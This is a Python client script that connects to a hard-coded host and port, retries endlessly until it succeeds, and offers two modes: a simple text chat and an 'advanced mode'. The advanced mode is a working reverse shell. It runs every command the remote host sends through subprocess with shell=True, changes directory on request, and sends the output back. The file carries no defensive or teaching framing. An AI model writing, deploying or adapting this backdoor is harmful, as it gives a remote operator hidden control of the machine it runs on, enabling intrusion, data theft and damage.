import socket
import os
import subprocess

# CLIENT WORKING IN ADVANCED MODE
def advanced_mode():

        print("operating in ADVANCED MODE")
        current_WorkingDir = os.getcwd() + ">"
        s.send(str.encode(current_WorkingDir))

        while True:
                data = s.recv(1024)

                # CLOSES THE CONNECTION IF "data" IS "exit"
                if data.decode() == "exit":
                        print("host exited")
                        break

                if data[:2].decode("utf-8") == "cd":
                        os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        current_WorkingDir = os.getcwd() + ">"
                        s.send(str.encode(output_str + current_WorkingDir))
                        print(output_str)

# CLIENT WORKING IN NORMAL MODE
def normal_mode():

        print("operating in NORMAL MODE")

        while True:
                msg = s.recv(1024)

                # CLOSES THE CONNECTION IF "msg" IS "exit"
                if msg.decode() == "exit":
                        print("host exited")
                        break

                print(msg.decode())
                reply = input(">>>")

                # CLOSES THE CONNECTION IF "reply" IS "exit"
                if reply == "exit":
                        print("SUCCESSFULLY DIS-CONNECTED")
                        s.send(reply.encode())
                        break
                else:
                        s.send(reply.encode())

# STARTING CONNECTION WITH THE CLIENT
def start_connection():
    try:
        global s
        s = socket.socket()
        host = "192.168.43.23"
        port = 9999

        s.connect((host,port))
    except:
        print("trying to connect host....")
        start_connection()

    # opt  CONTAINS THE MODE OF WORKING
    opt = s.recv(1024).decode()

    if opt == '1':
        normal_mode()
    if opt == '2':
        advanced_mode()

# INITIATING CONNECTION
start_connection()
